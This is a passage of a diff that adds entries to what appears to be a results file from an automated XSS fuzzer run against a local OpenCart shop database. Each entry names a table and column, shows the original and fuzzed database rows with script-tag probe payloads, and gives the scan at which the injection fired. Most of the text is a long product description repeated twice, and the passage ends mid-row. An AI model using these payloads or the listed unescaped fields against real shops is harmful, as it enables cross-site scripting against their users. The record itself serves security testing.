+            original row: [51, 1, 'test 19', '', 'test 19', '', '']
+            fuzzed row: [51, 1, '""\'><script>xss(962653)</script>', '', 'test 19', '', '']
+            change: 'test 19' => '""'><script>xss(962653)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_category_description.name,http://localhost/,963785,"""'><script>xss(963785)</script>","
+            opencart.oc_category_description.name[26][2]
+            original row: [47, 1, 'test 15', '', 'test 15', '', '']
+            fuzzed row: [47, 1, '""\'><script>xss(963785)</script>', '', 'test 15', '', '']
+            change: 'test 15' => '""'><script>xss(963785)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_banner_image.title,http://localhost/,964294,"""'><script>xss(964294)</script>","
+            opencart.oc_banner_image.title[12][3]
+            original row: [97, 8, 1, 'Starbucks', '', 'catalog/demo/manufacturer/starbucks.png', 0]
+            fuzzed row: [97, 8, 1, '""\'><script>xss(964294)</script>', '', 'catalog/demo/manufacturer/starbucks.png', 0]
+            change: 'Starbucks' => '""'><script>xss(964294)</script>'
+            
+fuzzed after scan 17 / 625
+found as XSS in scan 18 / 625"
+opencart,oc_category_description.name,http://localhost/,964506,"""'><script>xss(964506)</script>","
+            opencart.oc_category_description.name[23][2]
+            original row: [44, 1, 'test 12', '', 'test 12', '', '']
+            fuzzed row: [44, 1, '""\'><script>xss(964506)</script>', '', 'test 12', '', '']
+            change: 'test 12' => '""'><script>xss(964506)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_setting.value,"http://localhost/new_admin/index.php?route=common/dashboard&user_token=36754fb83d2a620f99cc30c6bf69119
+http://localhost/new_admin/index.php?route=common/forgotten
+http://localhost/new_admin/index.php?route=common/login",965971,"""'><script>xss(965971)</script>","
+            opencart.oc_setting.value[14][4]
+            original row: [15, 0, 'config', 'config_language_admin', 'en-gb', 0]
+            fuzzed row: [15, 0, 'config', 'config_language_admin', '""\'><script>xss(965971)</script>', 0]
+            change: 'en-gb' => '""'><script>xss(965971)</script>'
+            
+fuzzed after scan 367 / 625
+found as XSS in scan 368 / 625"
+opencart,oc_banner_image.link,http://localhost/,966015,"""'><script>xss(966015)</script>","
+            opencart.oc_banner_image.link[8][4]
+            original row: [93, 8, 1, 'Canon', '', 'catalog/demo/manufacturer/canon.png', 0]
+            fuzzed row: [93, 8, 1, 'Canon', '""\'><script>xss(966015)</script>', 'catalog/demo/manufacturer/canon.png', 0]
+            change: '' => '""'><script>xss(966015)</script>'
+            
+fuzzed after scan 18 / 625
+found as XSS in scan 19 / 625"
+opencart,oc_category_description.name,http://localhost/,966043,"""'><script>xss(966043)</script>","
+            opencart.oc_category_description.name[9][2]
+            original row: [30, 1, 'Printers', '', 'Printers', '', '']
+            fuzzed row: [30, 1, '""\'><script>xss(966043)</script>', '', 'Printers', '', '']
+            change: 'Printers' => '""'><script>xss(966043)</script>'
+            
+fuzzed after scan 21 / 625
+found as XSS in scan 22 / 625"
+opencart,oc_product_description.name,http://localhost/,967890,"""'><script>xss(967890)</script>","
+            opencart.oc_product_description.name[11][2]
+            original row: [42, 1, 'Apple Cinema 30&quot;', ""&lt;p&gt;\r\n\t&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there's no limit to what you can achieve. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it's designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple's ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n\t&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n\tFeatures:&lt;/h3&gt;\r\n&lt;p&gt;\r\n\tUnrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIndustry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIncredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tLightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSimple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tSingle cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBuilt-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHuge virtual workspace, very small footprint.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tNarrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUnique hinge design for effortless adjustment&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n\tTechnical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tApple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tThin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t2048 x 1280&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1920 x 1200&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1280 x 800&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tAntiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDisplay Power,&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSystem sleep, wake&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBrightness&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMonitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n\tCable&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDVI (Digital Visual Interface)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tFireWire 400&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUSB 2.0&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tConnectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tKensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n\tRequires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tCompatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tInput voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum power when operating: 150W&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEnergy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tStorage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tFCC Part 15 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55022 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55024&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tVCCI Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tAS/NZS 3548 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCNS 13438 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tICES-003 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tISO 13406 part 2&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMPR II&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIEC 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUL 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCSA 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tENERGY STAR&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTCO '03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n\t30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHeight: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWidth: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDepth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWeight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tMac Pro, all graphic options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMacBook Pro&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWindows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n"", '', 'Apple Cinema 30', '', '']
+            fuzzed row: [42, 1, '""\'><script>xss(967890)</script>', ""&lt;p&gt;\r\n\t&lt;font face=&quot;helvetica,geneva,arial&quot; size=&quot;2&quot;&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The 30-inch Apple Cinema HD Display delivers an amazing 2560 x 1600 pixel resolution. Designed specifically for the creative professional, this display provides more space for easier access to all the tools and palettes needed to edit, format and composite your work. Combine this display with a Mac Pro, MacBook Pro, or PowerMac G5 and there's no limit to what you can achieve. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features an active-matrix liquid crystal display that produces flicker-free images that deliver twice the brightness, twice the sharpness and twice the contrast ratio of a typical CRT display. Unlike other flat panels, it's designed with a pure digital interface to deliver distortion-free images that never need adjusting. With over 4 million digital pixels, the display is uniquely suited for scientific and technical applications such as visualizing molecular structures or analyzing geological data. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Offering accurate, brilliant color performance, the Cinema HD delivers up to 16.7 million colors across a wide gamut allowing you to see subtle nuances between colors from soft pastels to rich jewel tones. A wide viewing angle ensures uniform color from edge to edge. Apple's ColorSync technology allows you to create custom profiles to maintain consistent color onscreen and in print. The result: You can confidently use this display in all your color-critical applications. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;Housed in a new aluminum design, the display has a very thin bezel that enhances visual accuracy. Each display features two FireWire 400 ports and two USB 2.0 ports, making attachment of desktop peripherals, such as iSight, iPod, digital and still cameras, hard drives, printers and scanners, even more accessible and convenient. Taking advantage of the much thinner and lighter footprint of an LCD, the new displays support the VESA (Video Electronics Standards Association) mounting interface standard. Customers with the optional Cinema Display VESA Mount Adapter kit gain the flexibility to mount their display in locations most appropriate for their work environment. &lt;br&gt;\r\n\t&lt;br&gt;\r\n\t&lt;/font&gt;&lt;font face=&quot;Helvetica&quot; size=&quot;2&quot;&gt;The Cinema HD features a single cable design with elegant breakout for the USB 2.0, FireWire 400 and a pure digital connection using the industry standard Digital Video Interface (DVI) interface. The DVI connection allows for a direct pure-digital connection.&lt;br&gt;\r\n\t&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;\r\n&lt;h3&gt;\r\n\tFeatures:&lt;/h3&gt;\r\n&lt;p&gt;\r\n\tUnrivaled display performance&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch (viewable) active-matrix liquid crystal display provides breathtaking image quality and vivid, richly saturated color.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 2560-by-1600 pixel resolution for display of high definition still and video imagery.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWide-format design for simultaneous display of two full pages of text and graphics.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIndustry standard DVI connector for direct attachment to Mac- and Windows-based desktops and notebooks&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIncredibly wide (170 degree) horizontal and vertical viewing angle for maximum visibility and color performance.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tLightning-fast pixel response for full-motion digital video playback.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for 16.7 million saturated colors, for use in all graphics-intensive applications.&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSimple setup and operation&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tSingle cable with elegant breakout for connection to DVI, USB and FireWire ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBuilt-in two-port USB 2.0 hub for easy connection of desktop peripheral devices.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports to support iSight and other desktop peripherals&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tSleek, elegant design&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHuge virtual workspace, very small footprint.&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tNarrow Bezel design to minimize visual impact of using dual displays&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUnique hinge design for effortless adjustment&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSupport for VESA mounting solutions (Apple Cinema Display VESA Mount Adapter sold separately)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;h3&gt;\r\n\tTechnical specifications&lt;/h3&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen size (diagonal viewable image size)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tApple Cinema HD Display: 30 inches (29.7-inch viewable)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen type&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tThin film transistor (TFT) active-matrix liquid crystal display (AMLCD)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Resolutions&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t2560 x 1600 pixels (optimum resolution)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t2048 x 1280&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1920 x 1200&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1280 x 800&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\t1024 x 640&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Display colors (maximum)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16.7 million&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Viewing angle (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t170° horizontal; 170° vertical&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Brightness (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 400 cd/m2&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Contrast ratio (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t700:1&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Response time (typical)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t16 ms&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Pixel pitch&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\t30-inch Cinema HD Display: 0.250 mm&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Screen treatment&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tAntiglare hardcoat&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;User controls (hardware and software)&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDisplay Power,&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSystem sleep, wake&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBrightness&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMonitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n\tCable&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDVI (Digital Visual Interface)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tFireWire 400&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUSB 2.0&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tConnectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tKensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n\tRequires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tCompatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tInput voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum power when operating: 150W&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEnergy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tStorage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tFCC Part 15 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55022 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55024&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tVCCI Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tAS/NZS 3548 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCNS 13438 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tICES-003 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tISO 13406 part 2&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMPR II&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIEC 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUL 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCSA 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tENERGY STAR&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTCO '03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n\t30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHeight: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWidth: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDepth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWeight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tMac Pro, all graphic options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMacBook Pro&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWindows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA 